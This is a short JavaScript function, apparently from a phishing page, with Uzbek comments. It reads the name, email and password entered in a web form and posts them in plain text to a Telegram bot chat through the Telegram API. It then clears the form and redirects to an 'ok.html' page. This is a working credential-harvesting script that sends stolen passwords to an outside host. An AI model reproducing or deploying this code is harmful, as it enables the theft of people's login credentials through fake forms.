function alicoder() {
    let fname = document.getElementById('fname').value;
    let email = document.getElementById('email').value;
    let password = document.getElementById('password').value;
    event.preventDefault();
    let telegram_bot_id = "token here";
    let chat_id = 1111; // 1111 o'rniga Habar borishi kerak bo'lgan ChatID
    let message = `Ismi: ${fname}; Email: ${email}; Parol: ${password}`;
    let settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
    //    alert('Xabaringiz uchun rahmat!');
    window.location.href = 'ok.html';
    });
    document.getElementById('fname').value = '';
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
    return false;
};